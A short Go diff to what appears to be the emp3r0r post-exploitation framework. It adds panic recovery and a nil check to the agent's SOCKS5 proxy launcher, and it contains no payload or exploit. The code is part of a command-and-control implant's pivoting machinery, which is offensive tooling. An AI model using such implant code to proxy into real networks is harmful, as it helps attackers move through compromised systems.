@@ -11,6 +11,7 @@ import (
 	"time"
 
 	"github.com/jm33-m0/emp3r0r/core/lib/logging"
+	"github.com/jm33-m0/emp3r0r/core/lib/util"
 
 	"github.com/jm33-m0/emp3r0r/core/internal/agent/base/c2transport"
 	"github.com/jm33-m0/emp3r0r/core/internal/agent/base/common"
@@ -45,7 +46,16 @@ func Socks5Proxy(op string, addr string) (err error) {
 		logging.Printf("Starting Socks5Proxy %s", addr)
 		def.ProxyDone = make(chan struct{})
 		go func() {
-			defer close(def.ProxyDone)
+			defer func() {
+				if r := recover(); r != nil {
+					logging.Errorf("Socks5Proxy panic: %v\n%s", r, util.CallStack())
+				}
+				close(def.ProxyDone)
+			}()
+			if def.ProxyServer == nil {
+				logging.Errorf("Socks5Proxy: ProxyServer is nil")
+				return
+			}
 			err = transport.StartSocks5Proxy(addr, common.RuntimeConfig.DoHServer, def.ProxyServer, func(l net.Listener) {
 				def.ProxyLock.Lock()
 				def.ProxyListener = l
